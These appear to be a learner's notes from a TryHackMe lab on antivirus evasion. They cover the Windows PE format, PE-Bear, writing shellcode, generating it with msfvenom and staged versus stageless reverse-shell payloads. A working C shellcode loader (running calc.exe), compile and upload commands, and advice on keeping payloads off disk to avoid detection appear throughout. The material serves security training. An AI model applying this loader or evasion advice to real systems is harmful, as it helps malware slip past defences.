Evade Anti-virus software
-upload shell code .exe file and gain a shell to find flags

Which Antivirus software is running on the vm?
-Windows Defender

-------------------------------------------------------------------------------------------------

PE: Windows Executable file format
-has various sections 
1. Headers: metadata, data pointers, entry point, section tables
2. Sections: code, imports and data

example of windows loader reads an executable binary and runs it as a process
1. type of file, file signature, compiled for x86 or x64, creation timestamp
2. parse number of sections the file contains
3. mapping file contents into memory based on entrypoint address or relative virtual address
4. import dlls, and other objects into memory
5. entrypoint address is located and main function runs

-malware analysts analyze exe files based on information in the PE header
-control data section to store shellcode
1. shellcode as local variable in the main function (.TEXT)
2. shellcode as global vairable (.Data)
3. shellcode as raw binary in an icon image (.rsrc)

PE-Bear
-tool used to parse EXE files and read details
File -> Load PEs
thm-intro2PE.exe
->General->MD5
530949

->DOS Hdr->Magic number->value
5A4D

-Optional Hdr->Entry Point
12E4

-File Hdr->Sections Count
7

name of the extra section
.flag

-click on .flag
THM{PE-N3w-s3ction!}

-------------------------------------------------------------------------------------------------------------------------------------------

Introduction to shellcode
-crafted machine code instructions that tell the vulnerable program to run additional function
-access to a system shell or create a reverse command shell
-modifies the code run flow to update registers and functions of the program
-generally written in assembly language and translated into hexadecimal opcodes
-unique shellcode helps in evading AV software

-understanding of x86 and x64 CPU architectures
-assembly language
-strong knowledge of C programming language
-familiarity with linux and windows os

Syscall: program requests the kernel to do something
-each OS has a different calling convention regarding syscalls
Linux: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

grab the thm.asm code
nasm -f elf64 thm.asm
nasm: compile .asm code
-f elf64: 64bit linux
-returns thm.o : object code
ld thm.o -o thm
ld: link object and obtain final executable
-o: output
./thm
-returns "THM,Rocks!"

objdump -d thm
-dumps .text section of the compiled binary
objcopy -j .text -O binary thm thm.text
-extract the text section into a new file thm.text
xxd -i thm.text
-output binary file in a C string directly

grab thm.c
gcc -g -Wall -z execstack thm.c -o thmx
./thmx
returns: "THM, Rocks!"

grab flag.c
gcc -g -Wall -z execstack flag.c -o flagx
./flagx
retuns flag: THM{y0ur-1s7-5h311c0d3}

------------------------------------------------------------------------------------------------------------------------------------------

Generating Shellcode

-shellcode can be generated for a specific format with a particular programming language
-positives: no expertise needed to generate shellcode
-negatives: almost all generated shellcodes are well-known to AV vendors and are easily detected

eg: shellcode that runs calc.exe
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
-inject generated shellcode into a C code: calc.c

#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}

-compile C program
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
-connect to smbclient of machine
smbclient -u thm '//IP/Tools'
-enter password: Password321
-put the compiled program
put calc-MSF.exe

Generate Shellcode from EXE files
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
xxd -i /tmp/example.bin
-returns the same output as pervious shellcode

----------------------------------------------------------------------------------------------------------------------------------------------

Staged Payloads
-intermediary shellcode that acts as steps leading to execution of final shellcode
-intermediary shellcode: Stager

staged vs. stageless
-stageless advantages
1. no additonal network connections (less changes of being detected)
2. useful for restricted network connectivity
-Staged advantages
1. small footprint on disk
2. final shellcode is not embedded into executable
3. final shellcode is loaded into memory and not on disk (less prone to detection)
4. can reuse the same stage0 dropper for many shellcodes

stagers in metasploit
stageless: windows/x64/shell_reverse_tcp
staged: windows/x64/shell/reverse_tcp
